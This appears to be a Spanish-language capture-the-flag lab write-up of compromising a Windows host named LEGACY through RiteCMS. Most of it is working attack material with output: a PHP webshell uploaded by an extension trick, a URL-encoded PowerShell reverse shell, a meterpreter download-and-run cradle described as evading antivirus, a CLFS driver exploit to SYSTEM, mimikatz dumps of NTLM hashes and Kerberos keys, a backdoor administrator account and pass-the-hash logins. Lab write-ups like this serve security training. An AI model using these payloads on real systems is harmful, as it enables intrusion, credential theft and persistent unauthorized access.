/.hta.php             (Status: 403) [Size: 307]
/.hta                 (Status: 403) [Size: 307]
/.htpasswd            (Status: 403) [Size: 307]
/.htaccess.txt        (Status: 403) [Size: 307]
/.htaccess            (Status: 403) [Size: 307]
/.hta.txt             (Status: 403) [Size: 307]
/.htpasswd.php        (Status: 403) [Size: 307]
/.htaccess.php        (Status: 403) [Size: 307]
/.htpasswd.txt        (Status: 403) [Size: 307]
/aux.txt              (Status: 403) [Size: 307]
/aux                  (Status: 403) [Size: 307]
/aux.php              (Status: 403) [Size: 307]
/cgi-bin/             (Status: 403) [Size: 307]
/cms                  (Status: 301) [Size: 348] [--> http://192.168.161.249:8000/cms/]
/CMS                  (Status: 301) [Size: 348] [--> http://192.168.161.249:8000/CMS/]
/com1.txt             (Status: 403) [Size: 307]
/com2.php             (Status: 403) [Size: 307]
/com2                 (Status: 403) [Size: 307]
/com1.php             (Status: 403) [Size: 307]
/com2.txt             (Status: 403) [Size: 307]
/com1                 (Status: 403) [Size: 307]
/com3.txt             (Status: 403) [Size: 307]
/com3                 (Status: 403) [Size: 307]
/com3.php             (Status: 403) [Size: 307]
/con.txt              (Status: 403) [Size: 307]
/con                  (Status: 403) [Size: 307]
/con.php              (Status: 403) [Size: 307]
/dashboard            (Status: 301) [Size: 354] [--> http://192.168.161.249:8000/dashboard/]
/examples             (Status: 503) [Size: 407]
/favicon.ico          (Status: 200) [Size: 30894]
/img                  (Status: 301) [Size: 348] [--> http://192.168.161.249:8000/img/]
/Index.php            (Status: 302) [Size: 0] [--> http://192.168.161.249:8000/dashboard/]
/index.php            (Status: 302) [Size: 0] [--> http://192.168.161.249:8000/dashboard/]
/index.php            (Status: 302) [Size: 0] [--> http://192.168.161.249:8000/dashboard/]
/licenses             (Status: 403) [Size: 426]
/lpt1                 (Status: 403) [Size: 307]
/lpt2                 (Status: 403) [Size: 307]
/lpt1.php             (Status: 403) [Size: 307]
/lpt2.php             (Status: 403) [Size: 307]
/lpt1.txt             (Status: 403) [Size: 307]
/lpt2.txt             (Status: 403) [Size: 307]
/nul.php              (Status: 403) [Size: 307]
/nul                  (Status: 403) [Size: 307]
/nul.txt              (Status: 403) [Size: 307]
/phpmyadmin           (Status: 403) [Size: 426]
/prn                  (Status: 403) [Size: 307]
/prn.txt              (Status: 403) [Size: 307]
/prn.php              (Status: 403) [Size: 307]
/server-info          (Status: 403) [Size: 426]
/server-status        (Status: 403) [Size: 426]
/webalizer            (Status: 403) [Size: 426]
Progress: 13842 / 13845 (99.98%)
===============================================================
Finished
===============================================================
```

#### Paso 2: Explotacion del vector RCE por RiteCMS v3

1. Accedemos a la url `http//192.168.xxx.249:8000/cms/admin.php`
2. Ingresamos credenciales por defecto **admin/admin** y generamos un login exitoso.
3. De los 4 metodos que expone Exploit Database usaremos el segundo para evadir las reglas de .htaccess.
4. Creamos el webshell.pHp 
> ‚ö†Ô∏è Importante: usar la extensi√≥n **.pHp**, respetando may√∫sculas y min√∫sculas.

```php
<?php system($_GET[base64_decode('Y21k')]); ?>
```
#### Una vez creado el webshell.pHp lo subimos en cualquier directorio (media o files) y eso es todo. Tenemos RCE.
```
http://192.168.161.249:8000/cms/media/webshell.pHp?cmd=whoami

legacy\adrian 

---

http://192.168.161.249:8000/cms/media/webshell.pHp?cmd=ipconfig

Windows IP Configuration Ethernet adapter Ethernet0: 
Connection-specific DNS Suffix . : 
IPv4 Address. . . . . . . . . . . : 192.168.161.249 
Subnet Mask . . . . . . . . . . . : 255.255.255.0 
Default Gateway . . . . . . . . . : 192.168.161.254 

---
http://192.168.161.249:8000/cms/media/webshell.pHp?cmd=net user

User accounts for \\LEGACY 
------------------------------------------------------------------------------- 
Administrator 
adrian 
damon 
DefaultAccount 
Guest 
WDAGUtilityAccount 
The command completed successfully.
---
http://192.168.161.249:8000/cms/media/webshell.pHp?cmd=dir%20C:\Users\adrian\Desktop

Volume in drive C has no label. Volume Serial Number is 12DF-ECB8 Directory of C:\Users\adrian\Desktop 06/04/2025 02:01 PM
. 10/20/2022 01:45 AM
.. 06/04/2025 02:01 PM 34 local.txt 1 File(s) 34 bytes 2 Dir(s) 10,563,198,976 bytes free 
```
- Podemos obtener el primer flag: **local.txt**

```
http://192.168.161.249:8000/cms/media/webshell.pHp?cmd=type%20C:\Users\adrian\Desktop\local.txt
```
- Necesitamos un reverse shell en Lecgacy para trabajar con mas comodidad

Podemos ejecutar en una sola linea a traves del mismo shell que subimos y luego subir un backdoor de metasploit para obtener un shell mas robusto y estable.
```
powershell%20-nop%20-c%20%22$client%20%3D%20New-Object%20System.Net.Sockets.TCPClient('192.168.45.239'%2C4444)%3B$stream%20%3D%20$client.GetStream()%3B[byte[]]$bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile(($i%20%3D%20$stream.Read($bytes%2C%200%2C%20$bytes.Length))%20-ne%200)%7B%3B$data%20%3D%20(New-Object%20-TypeName%20System.Text.ASCIIEncoding).GetString($bytes%2C0%2C%20$i)%3B$sendback%20%3D%20(iex%20$data%202%3E%261%20%7C%20Out-String)%20%3B$sendback2%20%3D%20$sendback%20%2B%20'PS%20'%20%2B%20(pwd).Path%20%2B%20'%3E%20'%3B$sendbyte%20%3D%20([text.encoding]::ASCII).GetBytes($sendback2)%3B$stream.Write($sendbyte%2C0%2C$sendbyte.Length)%3B$stream.Flush()%7D%22
```
- En nuestro receptor nc:

```powershell
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali/OffSec/Challenges/2_Relia]
‚îî‚îÄ# nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.45.239] from (UNKNOWN) [192.168.180.249] 62914
whoami
legacy\adrian
PS C:\xampp\htdocs\cms\media>
```

- Enumeracion rapida antes de obtener un mejor shell:

```
PS C:\Users\adrian\Desktop> whoami /all
                                                                                                                                                                                                                  
USER INFORMATION                                                                                                                                                                                                  
----------------                                                                                                                                                                                                  
                                                                                                                                                                                                                  
User Name     SID                                                                                                                                                                                                 
============= ============================================                                                                                                                                                        
legacy\adrian S-1-5-21-464543310-226837244-3834982083-1004


GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes                                        
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users         Alias            S-1-5-32-555 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                 Well-known group S-1-5-6      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                        Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
LOCAL                                Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288                                                   


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

PS C:\Users\adrian\Desktop> 

```

#### üìå Resumen de lo encontrado
‚úÖ Usuario:

    legacy\adrian

    SID: S-1-5-21-464543310-226837244-3834982083-1004

‚úÖ Grupos:

    No forma parte de Administrators.

    Pero es miembro de Remote Desktop Users, lo que implica acceso por RDP si se habilita el servicio.

‚úÖ Privilegios destacados:

    SeImpersonatePrivilege ‚Üí ‚úÖ Cr√≠tico para escalada de privilegios

    SeChangeNotifyPrivilege ‚Üí com√∫n, no explotable

    SeCreateGlobalPrivilege ‚Üí √∫til en algunas condiciones

    SeIncreaseWorkingSetPrivilege ‚Üí normalmente no √∫til

Podemos usar PrintSpoofer para escalar privilegios y obtener credenciales para pivoting, movimiento lateral etc. pero antes debemos verificar
si el servicio **Spooler** esta corriendo y de lo contrario si podemos iniciarlo para ejecutar PrintSpoofer:

```powershell
PS C:\Users\adrian\Desktop> Get-Service Spooler

Status   Name               DisplayName                           
------   ----               -----------                           
Stopped  Spooler            Print Spooler                         


PS C:\Users\adrian\Desktop> Start-Service -Name Spooler
PS C:\Users\adrian\Desktop> Get-Service Spooler

Status   Name               DisplayName                           
------   ----               -----------                           
Stopped  Spooler            Print Spooler                         


PS C:\Users\adrian\Desktop>
```
Como no podemos iniciar el servicio, pasamos de momento a estabilizar el shell con **msf**

1. Creamos el backdoor.

```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali/OffSec/Challenges/2_Relia]
‚îî‚îÄ# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.239 LPORT=443 -f psh-reflection -o meterpreter.ps1
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 772 bytes
Final size of psh-reflection file: 3551 bytes
Saved as: meterpreter.ps1
```

* `windows/x64/meterpreter/reverse_https`: m√°s estable y discreto que reverse_tcp.
* `-f psh-reflection`: formato para ejecuci√≥n directa en memoria v√≠a PowerShell.
* `meterpreter.ps1`: script que cargar√°s desde la v√≠ctima.

2. Levantamos un servidor en nuestro kali
3. Configuramos y ejecutamos nuestro meterpreter:
```meterpreter
msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set LHOST 192.168.45.239
LHOST => 192.168.45.239
msf6 exploit(multi/handler) > set LPORT 443
LPORT => 443
msf6 exploit(multi/handler) > set ExitOnSession false
ExitOnSession => false
msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/handler) > 
[*] Started HTTPS reverse handler on https://192.168.45.239:443
[*] https://192.168.45.239:443 handling request from 192.168.180.249; (UUID: naypubax) Staging x64 payload (204892 bytes) ...
[*] Meterpreter session 1 opened (192.168.45.239:443 -> 192.168.180.249:62948) at 2025-06-05 10:57:56 -0300
```
4. Desde la maquina victima solicitamos y ejecutamos el backdoor.
```
IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.239:8000/meterpreter.ps1')
```
> Datos sobre este comando

‚û°Ô∏è Descarga y ejecuta en memoria directamente el contenido del script (meterpreter.ps1) desde nuestro servidor.

    DownloadString(...) ‚Üí baja el texto del script.

    IEX (alias de Invoke-Expression) ‚Üí ejecuta ese texto como c√≥digo PowerShell.

üî∏ No deja rastro en disco
üî∏ Ideal para bypassear AVs b√°sicos o EDRs sin disco

#### Paso 2: Escalada de privilegios en LEGACY
1. Enumeracion con nuestro meterpreter

La enumeracion basica que generamos nos da los mismos resultados que ya teniamos. Ejecutamos la session actual de meterpreter en background
y utilizamos el modulo **suggester**

```meterpreter
meterpreter > background
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > use post/multi/recon/local_exploit_suggester
msf6 post(multi/recon/local_exploit_suggester) > set SESSION 1
SESSION => 1
msf6 post(multi/recon/local_exploit_suggester) > run
[*] 192.168.180.249 - Collecting local exploits for x64/windows...
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/logging-2.4.0/lib/logging.rb:10: warning: /usr/lib/x86_64-linux-gnu/ruby/3.3.0/syslog.so was loaded from the standard library, but will no longer be part of the default gems starting from Ruby 3.4.0.
You can add syslog to your Gemfile or gemspec to silence this warning.
Also please contact the author of logging-2.4.0 to request adding syslog into its gemspec.
[*] 192.168.180.249 - 203 exploit checks are being tried...
[+] 192.168.180.249 - exploit/windows/local/cve_2022_21882_win32k: The service is running, but could not be validated. May be vulnerable, but exploit not tested on Windows Server 2022
[+] 192.168.180.249 - exploit/windows/local/cve_2022_21999_spoolfool_privesc: The target appears to be vulnerable.
[+] 192.168.180.249 - exploit/windows/local/cve_2023_28252_clfs_driver: The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default
[+] 192.168.180.249 - exploit/windows/local/cve_2024_30088_authz_basep: The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: 1006
[+] 192.168.180.249 - exploit/windows/local/cve_2024_35250_ks_driver: The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2022
[+] 192.168.180.249 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[*] Running check method for exploit 48 / 48
[*] 192.168.180.249 - Valid modules for session 1:
============================

 #   Name                                                           Potentially Vulnerable?  Check Result
 -   ----                                                           -----------------------  ------------
 1   exploit/windows/local/cve_2022_21882_win32k                    Yes                      The service is running, but could not be validated. May be vulnerable, but exploit not tested on Windows Server 2022                                                                                        
 2   exploit/windows/local/cve_2022_21999_spoolfool_privesc         Yes                      The target appears to be vulnerable.                                                                     
 3   exploit/windows/local/cve_2023_28252_clfs_driver               Yes                      The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default                                                    
 4   exploit/windows/local/cve_2024_30088_authz_basep               Yes                      The target appears to be vulnerable. Version detected: Windows Server 2022. Revision number detected: 1006                                                                                                  
 5   exploit/windows/local/cve_2024_35250_ks_driver                 Yes                      The target appears to be vulnerable. ks.sys is present, Windows Version detected: Windows Server 2022    
 6   exploit/windows/local/ms16_075_reflection                      Yes                      The target appears to be vulnerable.
```
En pricipio vimos SeImpersonatePrivileges avilitados pero el servicio Spooler que necesitamos 
no se encuentra disponible, y tampoco tenemos permisos para iniciarlo.

Podemos intentar con **clfs_driver** en comparacion con **Spooler fool**

#### üß† Comparaci√≥n T√©cnica de los Exploits

| CVE                | Nombre      | Requiere servicios | Requiere reinicio | Fiabilidad | Compatibilidad con Win Server 2022 |
| ------------------ | ----------- | ------------------ | ----------------- | ---------- | ---------------------------------- |
| **CVE-2022-21999** | SpoolFool   | **S√≠**, `Spooler`  | No                | Media      | Compatible si el spooler corre     |
| **CVE-2023-28252** | CLFS Driver | **No**             | No                | **Alta**   | ‚úîÔ∏è Confirmado por Metasploit       |

#### Utilizamos msf el exploit clfs:

```meterpreter
msf6 exploit(multi/handler) > use exploit/windows/local/cve_2023_28252_clfs_driver
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > set SESSION 1
SESSION => 1
msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > LHOST 192.168.45.239
[-] Unknown command: LHOST. Did you mean hosts? Run the help command for more details.
msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > set LHOST 192.168.45.239
LHOST => 192.168.45.239
msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > set LPORT 1234
LPORT => 1234
msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
PAYLOAD => windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/local/cve_2023_28252_clfs_driver) > run
[*] Started reverse TCP handler on 192.168.45.239:1234 
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. The target is running windows version: 10.0.20348.0 which has a vulnerable version of clfs.sys installed by default
[*] Launching msiexec to host the DLL...
[+] Process 4180 launched.
[*] Reflectively injecting the DLL into 4180...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (203846 bytes) to 192.168.180.249
[*] Meterpreter session 2 opened (192.168.45.239:1234 -> 192.168.180.249:62876) at 2025-06-05 17:05:53 -0300

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > 
```
- Cargamos **kiwi** para obtener credenciales:

```
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
meterpreter > creds_all
[+] Running as SYSTEM
[*] Retrieving all credentials
msv credentials
===============

Username       Domain  NTLM                              SHA1
--------       ------  ----                              ----
Administrator  LEGACY  387aef0561b65e4f3cae0960b0fba2d5  d85af7697714a10fdc862d2a36cfe1cfb9df046b
adrian         LEGACY  e3cea06e2de8d54d43b84d4b5bffb5b0  0471c9cb2ae0977d6fa051e6252d272a0e81ca75
pwned          LEGACY  8119935c5f7fa5f57135620c8073aaca  f60d7d6f41f4e0232b620aa2429cdaba85abc63d

wdigest credentials
===================

Username       Domain     Password
--------       ------     --------
(null)         (null)     (null)
Administrator  LEGACY     (null)
LEGACY$        WORKGROUP  (null)
adrian         LEGACY     (null)
pwned          LEGACY     (null)

kerberos credentials
====================

Username       Domain     Password
--------       ------     --------
(null)         (null)     (null)
Administrator  LEGACY     (null)
adrian         LEGACY     (null)
legacy$        WORKGROUP  (null)
pwned          LEGACY     (null)


meterpreter > 
```
> El usuario **pwned** es un usuario que genere yo para entrar por RDP:
```
meterpreter > shell
Process 4500 created.
Channel 1 created.
Microsoft Windows [Version 10.0.20348.1006]
(c) Microsoft Corporation. All rights reserved.

C:\xampp\htdocs\cms\media>cd C:\Users
cd C:\Users

C:\Users>net user pwned password123! /add
net user pwned password123! /add
The command completed successfully.


C:\Users>net localgroup Administrators pwned /add                                                                       
net localgroup Administrators pwned /add                                                                                
The command completed successfully.                                                                                     


C:\Users>net localgroup "Remote Desktop Users" pwned /add
net localgroup "Remote Desktop Users" pwned /add
The command completed successfully.


C:\Users>
```
#### Obtenemos el flag proof en .180.249

```powershell
PS C:\Users\Administrator\Desktop> Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContin        ue

Get-ChildItem -Path C:\Users -Include *.txt -File -Recurse -ErrorAction SilentlyContinue

    Directory: C:\Users\adrian\Desktop

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----          6/5/2025  12:38 PM             34 local.txt                                                            

    Directory: C:\Users\damon\Desktop

Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-a----          6/5/2025  12:38 PM             34 proof.txt                                                            


PS C:\Users\Administrator\Desktop> 

PS C:\Users> type damon\Desktop\proof.txt
type damon\Desktop\proof.txt
bda74c52627c3c64c3f59514ca124ed7
PS C:\Users>
```
- Ya obtivimos un hash NTLM del usuario administrador. 

```bash
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali/OffSec/Challenges/2_Relia]
‚îî‚îÄ# evil-winrm -i 192.168.180.249 -u 'Administrator' -H 387aef0561b65e4f3cae0960b0fba2d5 -P 5985
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 

```
- A partir de este punto podemos acceder a esta maquina con permisos administrativos elevados y utilizar el host como punto de pivote mas adelante.

Buscamos mas credenciales en el host:

```
meterpreter > kiwi_cmd "lsadump::sam"
Domain : LEGACY
SysKey : 64739ab3729cd3b69b8a2112d7f813bd
Local SID : S-1-5-21-464543310-226837244-3834982083

SAMKey : 182f3f06a90f8964d5f3e42a4471f991

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 387aef0561b65e4f3cae0960b0fba2d5

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 43c134075ee0781f000afa9852286526

* Primary:Kerberos-Newer-Keys *
    Default Salt : LEGACYAdministrator
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 8f63ebd63ab3648b2fd2b564171599b1ccef1dd2ae516747268e8e8c4b039b62
      aes128_hmac       (4096) : a8157f683f9b1ccf5eda82f45efb3645
      des_cbc_md5       (4096) : 297c2c64e0f7c1f1
    OldCredentials
      aes256_hmac       (4096) : 5d8412c2b5c287800912c25e1d01726d0a38dc92620817ac8b3a3695527b9176
      aes128_hmac       (4096) : d03fccb1f24da612e10c2dcc95ab1162
      des_cbc_md5       (4096) : 1004b6fe26da7a4a

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : LEGACYAdministrator
    Credentials
      des_cbc_md5       : 297c2c64e0f7c1f1
    OldCredentials
      des_cbc_md5       : 1004b6fe26da7a4a


RID  : 000001f5 (501)
User : Guest

RID  : 000001f7 (503)
User : DefaultAccount

RID  : 000001f8 (504)
User : WDAGUtilityAccount
  Hash NTLM: 1ab23de33bb51f7526de86958813cc52

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : bd034c3348b4c73a68bd0764114b4c3f

* Primary:Kerberos-Newer-Keys *
    Default Salt : WDAGUtilityAccount
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 9ea70bf88c7654331ee08c544988a68cd1bd0080522ebd67d6b02996920d224c
      aes128_hmac       (4096) : 8379e6ae1779b92efacf24d6e65db8c2
      des_cbc_md5       (4096) : 1a1c01f797c7d97f

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : WDAGUtilityAccount
    Credentials
      des_cbc_md5       : 1a1c01f797c7d97f


RID  : 000003eb (1003)
User : damon
  Hash NTLM: 820d6348890893116880101307197052

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : a49961c60b9d2aaeec9bb7c61ef6d1cd

* Primary:Kerberos-Newer-Keys *
    Default Salt : LEGACYdamon
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : a3f799da4cbaa571b4467cd05bbe29e38f83e06d6c9bc1b9366e8f45d32c5c46
      aes128_hmac       (4096) : 59a4a6226b3adbe1f22a3bdf8cdef2c5
      des_cbc_md5       (4096) : 809707e5a21f585b
    OldCredentials
      aes256_hmac       (4096) : 256f14b48c75d006ada2471a6f6c48391528410d0948293db856c8ef1bb2eac5
      aes128_hmac       (4096) : d5e61e12c02242aacbb974008e04bbc8
      des_cbc_md5       (4096) : 0164388cef4664fd

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : LEGACYdamon
    Credentials
      des_cbc_md5       : 809707e5a21f585b
    OldCredentials
      des_cbc_md5       : 0164388cef4664fd


RID  : 000003ec (1004)
User : adrian
  Hash NTLM: e3cea06e2de8d54d43b84d4b5bffb5b0

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 0fe6dc1f684e736780d99ac621d13651

* Primary:Kerberos-Newer-Keys *
    Default Salt : LEGACYadrian
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : 9d6caa520339858826216e146f197175983152ca6cc23600c90c59bb9f26ecca
      aes128_hmac       (4096) : 98a2a006eba652cdd5173acf15c16de8
      des_cbc_md5       (4096) : 45d6685898ae3e52
    OldCredentials
      aes256_hmac       (4096) : a1442b55e43679adca87f4cc85ff4a81cba38d6f967f15bfb79cff931f7fa1f6
      aes128_hmac       (4096) : 1b7ef6c5e883574d964cf0a80f3bd097
      des_cbc_md5       (4096) : 46c457ae237fd67c

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : LEGACYadrian
    Credentials
      des_cbc_md5       : 45d6685898ae3e52
    OldCredentials
      des_cbc_md5       : 46c457ae237fd67c


RID  : 000003ed (1005)
User : pwned
  Hash NTLM: 8119935c5f7fa5f57135620c8073aaca

Supplemental Credentials:
* Primary:NTLM-Strong-NTOWF *
    Random Value : 45fefcdc634f3d8931565bbed0275460

* Primary:Kerberos-Newer-Keys *
    Default Salt : LEGACYpwned
    Default Iterations : 4096
    Credentials
      aes256_hmac       (4096) : b79d6551adebfe18ef9f0230d94a17c5cfb226b25de0ad73dc122a417aed12e5
      aes128_hmac       (4096) : 7978a7fed2bd218bc91190cb5d9995c4
      des_cbc_md5       (4096) : a86462dcda2cab10

* Packages *
    NTLM-Strong-NTOWF

* Primary:Kerberos *
    Default Salt : LEGACYpwned
    Credentials
      des_cbc_md5       : a86462dcda2cab10
```

- **Con estas credenciales nos aseguramos el acceso al host LEGACY**

```
‚îå‚îÄ‚îÄ(root„âøkali)-[/home/kali/OffSec/Challenges/2_Relia]
‚îî‚îÄ# evil-winrm -i 192.168.180.249 -u 'damon' -H 820d6348890893116880101307197052 -P 5985 
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\damon\Documents> 
```


### Tabla de credenciales

| hostname | user | NTLM | password | 
|----------|------|------|----------|
|**LEGACY**| Administrator | 387aef0561b65e4f3cae0960b0fba2d5 | [x] |
|          | adrian | e3cea06e2de8d54d43b84d4b5bffb5b0 | [x] |
|          | damon | 820d6348890893116880101307197052 | [x] |


### Tabla de flags

| **hostname** | local | proof |
|--------------|-------|-------|
| **LEGACY** | 6de2be6545730d15382906e9f34e3db8 | bda74c52627c3c64c3f59514ca124ed7 |
|

## Troubleshooting
1. Tener el handler ya configurado y ejecutado a la hora de ejecutar el comando:
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.239:8000/meterpreter.ps1')
```

## Herramientas Alternativas
- [ ] **Herramienta 1:** Descripci√≥n breve (Comando)
- [ ] **Herramienta 2:** Descripci√≥n breve (Comando)
- [ ] **Herramienta 3:** Descripci√≥n breve (Comando)

